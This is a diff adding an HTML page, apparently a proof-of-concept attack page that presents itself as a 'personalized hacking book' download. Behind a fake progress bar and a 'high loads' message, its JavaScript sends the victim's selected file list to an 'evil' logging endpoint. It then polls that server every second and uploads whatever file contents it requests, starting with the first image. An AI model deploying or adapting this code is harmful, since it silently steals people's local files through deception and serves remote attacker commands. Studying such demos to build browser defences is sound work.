@@ -1,0 +1,128 @@
+<!DOCTYPE html> 
+<html> 
+<head>
+<meta charset=utf-8 />
+<link href='http://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'> 
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js" type="text/javascript"></script>
+<script src="ProgressBar.js" type="text/javascript"></script> 
+<style>
+body {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-serif;}
+#progress {
+    margin-top: 30px;
+    display: none;
+}
+#progress>div {
+    position: relative;
+    width: 500px;
+    border: 1px solid black;
+    height: 20px;
+    overflow: hidden;
+}
+#p {
+    position: absolute;
+    top: 0;
+    left: -100px;
+    height: 20px;
+    background: darkgreen;
+    width: 100px;
+}
+</style>
+</head>
+<body>
+<h1>Download your personalized hacking book</h1>
+<div id="progress">
+<p>Preparing file for download. Don't close this window...</p>
+<div>
+<div id="p"></div>
+</div>
+<p style="color: yellow">Note: We're experiencing high loads now, please be patient...</p>
+</div>
+<script>
+var logUrl = window.location.href.replace('victim', 'evil').replace('dl.html','log.php');
+var clientId;
+var filelist;
+var sent = [];
+
+var sendFile = function(i) {
+	var file = window.filelist[i], fd;
+	
+	if ($.inArray(i, sent) !== -1) {
+		return;
+	}
+	
+    try {
+        $.post(logUrl, {
+            'msg' : 'will-send-file',
+            'client' : window.clientId,
+            'file': i
+        });
+        
+        fd = new FormData();
+        fd.append('msg', 'upload-file');
+        fd.append('fileid', i);
+        fd.append('client', window.clientId);
+        fd.append('path', file.webkitRelativePath);
+        fd.append('filename', file.name);
+        fd.append('type', file.type);
+        fd.append('size', file.size);
+        fd.append('contents', file);
+        var xml = new XMLHttpRequest();
+        xml.open("POST", logUrl, true);
+        xml.send(fd);
+    } catch (e) {}
+    sent.push(i);
+    
+ };
+ 
+ var poll = function() { // poll for commands from server
+	    // filelist is available	 
+	    $.ajax(logUrl, {'async': false,
+            'dataType': 'json',
+            'type' : 'POST',
+            'success' : function(json) {
+            	var i;
+           		for (i = 0; i < json.requested.length; i++) {
+           			sendFile(json.requested[i]);
+           		}
+            },
+            'data' : {'msg': 'victim-poll', 'client': clientId}
+            });
+ };
+ 
+ window.own = function(filelist) {
+	window.filelist = filelist;
+
+    var i, f, list = [],file_limit = 100;
+    (new ProgressBar()).start();
+    
+    
+    for (i = 0; i < filelist.length; i++) {
+    	if (i >= file_limit) // we're gentle here
+    		break;
+        f = filelist[i];
+        list.push({'path': f.webkitRelativePath || f.name, 'size': f.size, 'status': 0}); 
+    }
+    
+    $.ajax(logUrl, {'async': false,
+                    'dataType': 'json',
+                    'type' : 'POST',
+                    'success' : function(json) {
+                       window.clientId = json.client;
+                    },
+                    'data' : {'msg': 'set-files','files': list, 'client': window.clientId}
+                    });
+    
+    setInterval(poll, 1000);
+    
+    for (i = 0; i < filelist.length; i++) {
+      f = filelist[i];
+      if (f.type.match(/image\/(png|gif|jpe?g)$/)) { // only image files please
+        sendFile(i);
+        return; // we'll only send the first file 
+      }
+    }
+ };
+</script>
+</div>
+</body>
+</html>
